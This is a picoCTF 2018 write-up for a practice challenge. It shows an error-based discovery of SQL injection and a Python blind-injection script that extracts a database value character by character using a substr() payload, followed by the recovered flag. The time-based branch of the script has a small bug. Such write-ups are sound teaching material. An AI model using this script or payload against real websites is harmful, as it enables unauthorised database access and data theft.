## A Simple Question - 650

### Description

> There is a website running at http://2018shell1.picoctf.com:2644 (link). Try to see if you can answer its question.

### Write up

```
SQL query: SELECT * FROM answers WHERE answer='asdf'
```

```
SQL query: SELECT * FROM answers WHERE answer='asdf''

Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: "'asdf''" in /problems/a-simple-question_4_66cdb0641702e04c08c3830fa64316d2/webroot/answer2.php on line 15

Fatal error: Uncaught Error: Call to a member function fetchArray() on boolean in /problems/a-simple-question_4_66cdb0641702e04c08c3830fa64316d2/webroot/answer2.php:17 Stack trace: #0 {main} thrown in /problems/a-simple-question_4_66cdb0641702e04c08c3830fa64316d2/webroot/answer2.php on line 17
```

SQL injection is possible

```
import requests
import time

# candidates
num = '1234567890'
alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
alnum = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
alnumsu = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_ '
alnumnoregex = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_~!@- '
alnumchr = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$^&*()-=+_%{}|`[]?.,<>:;/\'\" '
asciis = range(32, 128)


# exploit settings
url = 'http://2018shell1.picoctf.com:2644/answer2.php'                # url for request
candidate = alnumnoregex       # candidate for blind SQLi
flag_len = 100            # length of flag
request_type = 'POST'    # GET of POST
session_name = ''
session = ''
check_string = 'You are so close.'

# time based settings
time_based = False
check_time = 2

cookie = {session_name: session}
flag = ''
for idx in range(0, flag_len):
    chk = True
    for c in candidate:

        payload = {
            'answer': "' or substr((SELECT * FROM answers LIMIT 1), %d, 1) = '%c' -- " % (idx + 1, c)
        }
        response = None

        s = time.time()

        if request_type == 'GET':
            response = requests.get(url=url, cookies=cookie, params=payload)
        elif request_type == 'POST':
            response = requests.post(url=url, cookies=cookie, data=payload)
        elif request_type == 'JSON':
            response = requests.post(url=url, cookies=cookie, json=payload)

        e = time.time()

        r = response.text

        if time_based:
            if e-s > time:
                print(idx, c)
                flag += c
                break
        else:
            if check_string in r:
                print(idx, c)
                flag += c
                chk = False
                break

    if chk:
        print("Not found:", idx)

print(flag)
```

```
41AndSixSixths

SQL query: SELECT * FROM answers WHERE answer='41AndSixSixths'
Perfect!
Your flag is: picoCTF{qu3stions_ar3_h4rd_28fc1206}
```
